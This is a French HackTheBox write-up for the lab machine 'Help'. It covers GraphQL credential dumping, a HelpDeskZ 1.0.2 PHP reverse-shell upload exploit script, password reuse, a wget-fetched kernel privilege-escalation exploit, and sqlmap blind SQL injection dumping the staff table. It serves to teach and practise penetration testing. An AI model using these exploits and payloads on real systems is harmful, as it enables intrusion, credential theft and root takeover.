---
title: HTB | Help
description: Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of credentials for a HelpDesk software. The software is vulnerable to blind SQL injection which can be exploited to get a password for SSH Login. Alternatively an unauthenticated arbitrary file upload can be exploited to get RCE. Then the kernel is found to be vulnerable and can be exploited to get a root shell.
slug: help-htb
date: 2025-08-27 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Help cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Help</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.121</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## System Info
```bash
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.5 LTS
Release:	16.04
Codename:	xenial
```

## Users
```bash
## Graphql
helpme@helpme.com : godhelpmeplz
## PAM  / SSH
help : Welcome1
```

## Enumeration

### nmap

```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.121
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5bb4d9cdeaf6bbfba8c227ad8d74328 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5b010507486a39fc5536f3b4a246119 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e21b88d37621d41e38154a8111b79907 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://help.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

## Foothold

### Graphql : Getting creds using the API

On découvre une API graphql sur le port 3000 à l'aide **dirsearch**. A l'aide de **ChatGPT**, on comprend comment effectuer des requêtes afin de comprendre la structure des données disponibles et de récupérer des informations.

On trouve finalement un user/password après quelques requetes :
```bash
$ dirsearch -u http://10.10.10.121:3000/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://10.10.10.121:3000/

[00:50:04] Scanning: 
[00:50:13] 400 -    18B - /graphql
[00:50:13] 400 -    18B - /graphql/
[00:50:13] 400 -    18B - /graphql/console
[00:50:13] 400 -    18B - /graphql/schema.yaml
[00:50:13] 400 -    18B - /graphql/graphql
[00:50:13] 400 -    18B - /graphql/schema.json
[00:50:13] 400 -    18B - /graphql/schema.xml

Task Completed

$ curl -X POST http://10.10.10.121:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'

{"data":{"__typename":"Query"}}

$ curl -X POST http://10.10.10.121:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

{"data":{"__schema":{"types":[{"name":"Query","fields":[{"name":"user"}]},{"name":"User","fields":[{"name":"username"},{"name":"password"}]},{"name":"String","fields":null},{"name":"__Schema","fields":[{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}]},{"name":"__Type","fields":[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},{"name":"ofType"}]},{"name":"__TypeKind","fields":null},{"name":"Boolean","fields":null},{"name":"__Field","fields":[{"name":"name"},{"name":"description"},{"name":"args"},{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__InputValue","fields":[{"name":"name"},{"name":"description"},{"name":"type"},{"name":"defaultValue"}]},{"name":"__EnumValue","fields":[{"name":"name"},{"name":"description"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__Directive","fields":[{"name":"name"},{"name":"description"},{"name":"locations"},{"name":"args"}]},{"name":"__DirectiveLocation","fields":null}]}}}

$  curl -X POST http://10.10.10.121:3000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { username password } }"}'

{"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}
```
Avec **hashcat**, on reussi à récupérer le mot de passe suivant : `godhelpmeplz`
```bash
hashcat -m 0 ./hash.txt ~/wordlists/rockyou.txt --show
5d3c93182bb20f07b994a7f617e99cff:godhelpmeplz
```

### Helpdeskz - version 1.0.2
On remarque Helpdeskz est installé avec une version vulnérable (potentiellment 2 CVE).
```bash
http://help.htb/support/UPGRADING.txt
--------------
Welcome to HelpDeskZ 1.0.2
==========================

We have made some changes in this new version like:

- SEO-friendly URLs compatibility fixed

- Login with Facebook account (Facebook connect)

- Login with Google account (Google OAuth)
```

### File Upload : PHP reverse shell
On trouve un premier exploit qui ne fonctionne pas, il s'agit d'un file upload permettant d'executer du code php. En realité la machine est bien exploitable, mais l'exploit ne fonctionne pas à cause d'un problème d'horaire. La machine n'est pas à la meme heure que la notre, et l'exploit est basé, en autre, sur l'heure. Il a donc fallu rajotuer dans l'exploit ceci:
```bash
##Getting the Time from the server
response = requests.head('http://10.10.10.121/support/')
serverTime = response.headers['Date']
##setting the time in Epoch
FormatTime = '%a, %d %b %Y %H:%M:%S %Z'
currentTime = int(calendar.timegm(time.strptime(serverTime, FormatTime)))
```
Cela permet de recuperer l'heure exacte défini sur Helpdeskz, c'est important pour la suite de l'exploitation. En cherchant un peu sur github, on trouve justement l'exploit original avec ces quelques lignes de code supplémentaire (je n'ai pas eu besoin de rajouter ce code moi même mais c'était faisable.).

Voici le fichier d'exploitation en Python permettant d'executer le fichier téléchargé sur la machine. Dans un premier temps il a fallu creer un ticket et ajouter une piece jointe avec un fichier php (reverse shell). Il faut, seulement ensuite, executer le code python qui doit retrouver le fichier php et l'executer.
```bash
##!/bin/python
##This is a modified version of https://www.exploit-db.com/raw/40300
##Since the sysntax on time calculation is incorect
'''
The default configuration of this software allows for php files  to be uploaded

Steps to reproduce

Fill out a ticket form and attach a php file, solve the captcha and upload,
(the application will display 'File is not allowed' but the file is still uploaded!!

Set up a netcat session to catch the reverse shell

Run this script and receive a reverse shell back!!!

'''
import hashlib
import time, calendar
import sys
import requests

print 'HelpDesk v1.0.2 - Unauthenticated shell upload'

if len(sys.argv) < 3:
    print "Usage: {} http://helpdeskz.com/support/uploads/tickets/ Reverse-shell.php".format(sys.argv[0])
    sys.exit(1)


helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

##Getting the Time from the server
response = requests.head('http://10.10.10.121/support/')
serverTime = response.headers['Date']
##setting the time in Epoch
FormatTime = '%a, %d %b %Y %H:%M:%S %Z'
currentTime = int(calendar.timegm(time.strptime(serverTime, FormatTime)))


for x in range(0,300):
    plaintext = fileName + str(currentTime -x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl + md5hash + '.php'
    response = requests.head(url)
    if response.status_code == 200:
        print("found!")
        print(url)
        sys.exit(0)

print("Sorry, I did not find anything")
```
On voit ici l'obtention d'un reverse shell :
```bash
$ nc -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.121.
Ncat: Connection from 10.10.10.121:34876.
SOCKET: Shell has connected! PID: 1312
whoami
help
python3 -c 'import pty;pty.spawn("/bin/bash")'
help@help:/var/www/html/support/uploads/tickets$ export TERM=xterm
export TERM=xterm
help@help:/var/www/html/support/uploads/tickets$ ^Z
[1]  + 3405 suspended  nc -lnvp 9001
[Aug 26, 2025 - 00:39:46 (CEST)] exegol-pentest /workspace # stty raw -echo;fg     
[1]  + 3405 continued  nc -lnvp 9001

help@help:/var/www/html/support/uploads/tickets$ 
help@help:/var/www/html/support/uploads/tickets$ ls
072358eef300beb18834f16ffb121aee.php  5d13aeec839047b1647d58538fd788b8.png
1041ae9bd805fcd792d6a1e775ca8fab.txt  c89564cd603a96bafcd9e53210d6042b.txt
11768880feca2125903635561dd4d047.php  fd517142e88d1dfb1c8616b7f8824891.txt
1c9c8783677b6498d5e2453241c6c3b9.php  index.php
316c27c726d57e961f236992c9788715.php
help@help:/var/www/html/support/uploads/tickets$ cd /home/
help@help:/home$ ls
help
help@help:/home$ cd help/
help@help:/home/help$ ls
help  npm-debug.log  user.txt
------------->
help@help:/home/help$ cat user.txt 
b800.....6650

----------------------------------------------------------------

python2 final2.py http://help.htb/support/uploads/tickets/ s2.php
HelpDesk v1.0.2 - Unauthenticated shell upload
1756161392
```
On obtient finalement un shell en tant que l'utilisateur `help`.

### Second File Upload / SQL Injection CVE
Une deuxième exploitation était possible. Il fallait se connecter avec les credentials trouvés dans **graphql** sur la plateforme Helpdeskz et poster un ticket avec une pièce-jointe. Il était alors possible ensuite de faire des requêtes vers cette pièce jointe en faisant une injection SQL dans l'url.

En sauvegardant la requête à l'aide Burp, puis en utilisant **sqlmap**, il n'est pas trop dur de l'exploiter. J'ai tenté d'utiliser une exploit déjà écrite, mais ça n'a pas fonctionné. A la fin, vous pouvez voir comment l'exploiter dans la section **Bonus**.

### mysql : staff table
En cherchant dans les fichiers de site web, on trouve un dossier includes avec un fichier config.php contenant les credentials pour se connecter à une base de donnée SQL. En cherchant dans la base de données on découvre une base de donnée support avec une table staff contenant un user "admin" et un hachage :
```bash
help@help:/var/www$ cd html
help@help:/var/www/html$ ls
index.html  support
help@help:/var/www/html$ cd support
help@help:/var/www/html/support$ ls
LICENSE.txt    captcha.php  facebookOAuth  images     js           views
README.md      controllers  favicon.ico    includes   readme.html
UPGRADING.txt  css          googleOAuth    index.php  uploads
help@help:/var/www/html/support$ cd includes/
help@help:/var/www/html/support/includes$ ls
PHPMailer      classes        helpdesk.inc.php  pipe.php
Twig           config.php     index.php         staff.inc.php
bootstrap.php  functions.php  language          support.sql
captcha.ttf    global.php     parser            timezone.inc.php
help@help:/var/www/html/support/includes$ cat config.php 
<?php
	$config['Database']['dbname'] = 'support';
	$config['Database']['tableprefix'] = '';
	$config['Database']['servername'] = 'localhost';
	$config['Database']['username'] = 'root';
	$config['Database']['password'] = 'helpme';
	$config['Database']['type'] = 'mysqli';
	?>
```
Connexion à la base de donnée `mysql` en utilisant les credentials trouvés précédemment :
```bash
help@help:/var/www/html/support/includes$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 785
Server version: 5.7.24-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> .tables
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.tables' at line 1
mysql> show tables;
ERROR 1046 (3D000): No database selected
mysql> show db;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'db' at line 1
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| support            |
| sys                |
+--------------------+
5 rows in set (0.02 sec)

mysql> use support
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
    -> ;
+--+
| Tables_in_support      |
+--+
| articles               |
| attachments            |
| canned_response        |
| custom_fields          |
| departments            |
| emails                 |
| error_log              |
| file_types             |
| knowledgebase_category |
| login_attempt          |
| login_log              |
| news                   |
| pages                  |
| priority               |
| settings               |
| staff                  |
| tickets                |
| tickets_messages       |
| users                  |
+--+
19 rows in set (0.00 sec)

mysql> select * from staff;
+----+----------+--------------------+---------------+--------------------+------------+------------+--------------------+----------+--------+--+--------+-------+--------+
| id | username | password                                 | fullname      | email              | login      | last_login | department         | timezone | signature                    | newticket_notification | avatar | admin | status |
+----+----------+--------------------+---------------+--------------------+------------+------------+--------------------+----------+--------+--+--------+-------+--------+
|  1 | admin    | d318f44739dced66793b1a603028133a76ae680e | Administrator | support@mysite.com | 1547216217 | 1543429746 | a:1:{i:0;s:1:"1";} |          | Best regards,
Administrator |                      0 | NULL   |     1 | Enable |
+----+----------+--------------------+---------------+--------------------+------------+------------+--------------------+----------+--------+--+--------+-------+--------+
1 row in set (0.00 sec)

mysql> exit;
```
En utilisant `crackstation.net`, on tente de retrouver le mot de passe relié au hachage et on obtient:
`d318f44739dced66793b1a603028133a76ae680e` -> Welcome1

On peut maintenant se connecter en SSH avec le compte help et ce mot de passe (PASSWORD REUSE...) :
```bash
ssh help@help.htb 
help@help.htb's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Fri Jan 11 06:18:50 2019
help@help:~$
```

## Privilege Escalation

### Vulnerable Kernel : Linux version 4.4.0-116-generic

En utilisant linpeas, on trouve la version du Kernel qui semble un peu vieux (Feb 12 21:23:04 UTC 2018) alors que la machine date de Janvier 2019. On tente une recherche sur internet et sur **searchsploit** pour voir si ce kernel est vulnerable.

Il semble que les Kernel linux en dessous de cette version sont vulnerable mais pas celle ci. C'est à dire : < 4.4.0-116-generic.
D'après ce que j'ai appris, il est toujours important de vérifier quand même si une exploitation est possible pour une version, même si c'est indiqué "<". Parfois, "<" est en realité "<=".
```bash
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.5 LTS
Release:	16.04
Codename:	xenial
```
J'ai récupérer l'exploit trouvé sur searchsploit :
```bash
searchsploit 4.4.0-116        
- -------------------------------------------------------
 Exploit Title
- -------------------------------------------------------
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
```
Il m'a suffit ensuite de la télécharger sur la machine, de le compiler avec gcc puis de l'executer afin d'obtenir un shell en tant que root :
```bash
help@help:~$ wget http://10.10.16.10:8000/44298.c
--2025-08-27 05:09:41--  http://10.10.16.10:8000/44298.c
Connecting to 10.10.16.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5773 (5.6K) [text/x-csrc]
Saving to: ‘44298.c’

44298.c                                              100%[=====================================================================================================================>]   5.64K  --.-KB/s    in 0.01s   

2025-08-27 05:09:42 (384 KB/s) - ‘44298.c’ saved [5773/5773]

help@help:~$ gcc 44298.c -o exploit
help@help:~$ chmod +x exploit
help@help:~$ ./exploit 
task_struct = ffff880015b98e00
uidptr = ffff8800192f7c04
spawning root shell
root@help:~# whoami
root
root@help:~# cat /root/root.txt 
924b.....f182
```

## Bonus

### CVE : SQL Injection (Authenticated)
Dans un premier temps, on se connecte à HelpdeskZ à l'aide des credentials trouvés sur Graphql. Ensuite, on poste un ticket avec une piece-jointe (pas de fichier php, n'importe lequel suffit). Ensuite, on va dans nos tickets et on essaye de telecharger notre pièce-jointe. On intercepte la requête dans **Burp**, il suffit ensuite de l'enregistrer dans un fichier puis de le passer en paramètre de **sqlmap** :
```bash
GET /support/?v=view_tickets&action=ticket&param[]=8&param[]=attachment&param[]=5&param[]=10 HTTP/1.1
Host: help.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://help.htb/support/?v=view_tickets&action=ticket&param[]=8
Cookie: lang=english; PHPSESSID=dh62bg5tt2j2gk4bofntn637q5; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BEWTAAjyRu71c6GI%2BULmLmTqISzoi3A27eA1M9ErCXvXw%3D%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
On enregistre cette requete dans un fichier **ticket.req**.

On execute **sqlmap** :
```bash
------------------------------------------------
$ sqlmap -r ticket.req --batch --dbs --thread 10 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.3.3#dev}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:37:53 /2025-08-27/

[14:37:53] [INFO] parsing HTTP request from 'ticket.req'
[14:37:53] [INFO] resuming back-end DBMS 'mysql' 
[14:37:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=8&param[]=attachment&param[]=5&param[]=10 AND 2859=2859

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: v=view_tickets&action=ticket&param[]=8&param[]=attachment&param[]=5&param[]=10 AND (SELECT 7344 FROM (SELECT(SLEEP(5)))Tifo)
---
[14:37:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[14:37:53] [INFO] fetching database names
[14:37:53] [INFO] fetching number of databases
[14:37:53] [INFO] retrieved: 5
[14:37:54] [INFO] retrieving the length of query output
[14:37:54] [INFO] retrieved: 18
[14:37:58] [INFO] retrieved: information_schema             
[14:37:58] [INFO] retrieving the length of query output
[14:37:58] [INFO] retrieved: 5
[14:38:00] [INFO] retrieved: mysql           
[14:38:00] [INFO] retrieving the length of query output
[14:38:00] [INFO] retrieved: 18
[14:38:03] [INFO] retrieved: performance_schema             
[14:38:03] [INFO] retrieving the length of query output
[14:38:03] [INFO] retrieved: 7
[14:38:06] [INFO] retrieved: support           
[14:38:06] [INFO] retrieving the length of query output
[14:38:06] [INFO] retrieved: 3
[14:38:07] [INFO] retrieved: sys           
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] support
[*] sys

[14:38:07] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/help.htb'

[*] ending @ 14:38:07 /2025-08-27/

--------------------------------------------------------------
$ sqlmap -r ticket.req --batch --thread 10 -D support --tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.3.3#dev}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:38:50 /2025-08-27/

[14:38:50] [INFO] parsing HTTP request from 'ticket.req'
[14:38:50] [INFO] resuming back-end DBMS 'mysql' 
[14:38:50] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=8&param[]=attachment&param[]=5&param[]=10 AND 2859=2859

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: v=view_tickets&action=ticket&param[]=8&param[]=attachment&param[]=5&param[]=10 AND (SELECT 7344 FROM (SELECT(SLEEP(5)))Tifo)
---
[14:38:51] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[14:38:51] [INFO] fetching tables for database: 'support'
[14:38:51] [INFO] fetching number of tables for database 'support'
[14:38:51] [INFO] retrieved: 19
...
...
[14:39:34] [INFO] retrieved: 5
[14:39:36] [INFO] retrieved: staff           
[14:39:36] [INFO] retrieving the length of query output
[14:39:36] [INFO] retrieved: 7
[14:39:39] [INFO] retrieved: tickets           
[14:39:39] [INFO] retrieving the length of query output
[14:39:39] [INFO] retrieved: 16
[14:39:42] [INFO] retrieved: tickets_messages             
[14:39:42] [INFO] retrieving the length of query output
[14:39:42] [INFO] retrieved: 5
[14:39:44] [INFO] retrieved: users           
Database: support
[19 tables]
+------------------------+
| articles               |
| attachments            |
| canned_response        |
| custom_fields          |
| departments            |
| emails                 |
| error_log              |
| file_types             |
| knowledgebase_category |
| login_attempt          |
| login_log              |
| news                   |
| pages                  |
| priority               |
| settings               |
| staff                  |
| tickets                |
| tickets_messages       |
| users                  |
+------------------------+

[14:39:44] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/help.htb'

[*] ending @ 14:39:44 /2025-08-27/

----------------------------------------------------------------------
$ sqlmap -r ticket.req --batch --thread 10 -D support -T staff --columns
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.3.3#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:40:14 /2025-08-27/

[14:40:14] [INFO] parsing HTTP request from 'ticket.req'
[14:40:15] [INFO] resuming back-end DBMS 'mysql' 
[14:40:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=8&param[]=attachment&param[]=5&param[]=10 AND 2859=2859

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: v=view_tickets&action=ticket&param[]=8&param[]=attachment&param[]=5&param[]=10 AND (SELECT 7344 FROM (SELECT(SLEEP(5)))Tifo)
---
[14:40:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[14:40:15] [INFO] fetching columns for table 'staff' in database 'support'
[14:40:15] [INFO] retrieved: 14
[14:40:16] [INFO] retrieving the length of query output
[14:40:16] [INFO] retrieved: 2
[14:40:17] [INFO] retrieved: id           
[14:40:17] [INFO] retrieving the length of query output
[14:40:17] [INFO] retrieved: 7
...
...
[14:41:18] [INFO] retrieved: 5
[14:41:19] [INFO] retrieved: admin           
[14:41:19] [INFO] retrieving the length of query output
[14:41:19] [INFO] retrieved: 6
[14:41:21] [INFO] retrieved: int(1)           
[14:41:21] [INFO] retrieving the length of query output
[14:41:21] [INFO] retrieved: 6
[14:41:24] [INFO] retrieved: status           
[14:41:24] [INFO] retrieving the length of query output
[14:41:24] [INFO] retrieved: 24
[14:41:28] [INFO] retrieved: enum('Enable','Disable')             
Database: support
Table: staff
[14 columns]
+------------------------+--------------------------+
| Column                 | Type                     |
+------------------------+--------------------------+
| admin                  | int(1)                   |
| status                 | enum('Enable','Disable') |
| avatar                 | varchar(200)             |
| department             | text                     |
| email                  | varchar(255)             |
| fullname               | varchar(100)             |
| id                     | int(11)                  |
| last_login             | int(11)                  |
| login                  | int(11)                  |
| newticket_notification | smallint(1)              |
| password               | varchar(255)             |
| signature              | mediumtext               |
| timezone               | varchar(255)             |
| username               | varchar(255)             |
+------------------------+--------------------------+

[14:41:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/help.htb'

[*] ending @ 14:41:28 /2025-08-27/

----------------------------------------------------------------------
$  sqlmap -r ticket.req --batch --thread 10 -D support -T staff --dump   
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.3.3#dev}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:41:39 /2025-08-27/

[14:41:39] [INFO] parsing HTTP request from 'ticket.req'
[14:41:39] [INFO] resuming back-end DBMS 'mysql' 
[14:41:39] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: param[] (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: v=view_tickets&action=ticket&param[]=8&param[]=attachment&param[]=5&param[]=10 AND 2859=2859

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: v=view_tickets&action=ticket&param[]=8&param[]=attachment&param[]=5&param[]=10 AND (SELECT 7344 FROM (SELECT(SLEEP(5)))Tifo)
---
[14:41:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[14:41:39] [INFO] fetching columns for table 'staff' in database 'support'
[14:41:39] [INFO] resumed: 14
...
...
[14:41:53] [INFO] retrieved: support@mysite.com             
[14:41:53] [INFO] retrieving the length of query output
[14:41:53] [INFO] retrieved: 13
[14:41:56] [INFO] retrieved: Administrator             
[14:41:56] [INFO] retrieving the length of query output
[14:41:56] [INFO] retrieved: 1
[14:41:57] [INFO] retrieved: 1
[14:41:58] [INFO] retrieving the length of query output
[14:41:58] [INFO] retrieved: 10
[14:42:01] [INFO] retrieved: 1543429746             
[14:42:01] [INFO] retrieving the length of query output
[14:42:01] [INFO] retrieved: 10
[14:42:03] [INFO] retrieved: 1547216217             
[14:42:03] [INFO] retrieving the length of query output
[14:42:03] [INFO] retrieved: 1
[14:42:04] [INFO] retrieved: 0
[14:42:04] [INFO] retrieving the length of query output
[14:42:04] [INFO] retrieved: 40
[14:42:12] [INFO] retrieved: d318f44739dced66793b1a603028133a76ae680e             
[14:42:12] [INFO] retrieving the length of query output
[14:42:12] [INFO] retrieved: 28
[14:42:17] [INFO] retrieved: Best regards,  Administrator             
[14:42:17] [INFO] retrieving the length of query output
[14:42:17] [INFO] retrieved: 0
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[14:42:18] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                           
[14:42:21] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[14:42:21] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[14:42:21] [INFO] retrieving the length of query output
[14:42:21] [INFO] retrieved: 5
[14:42:23] [INFO] retrieved: admin           
[14:42:23] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[14:42:23] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
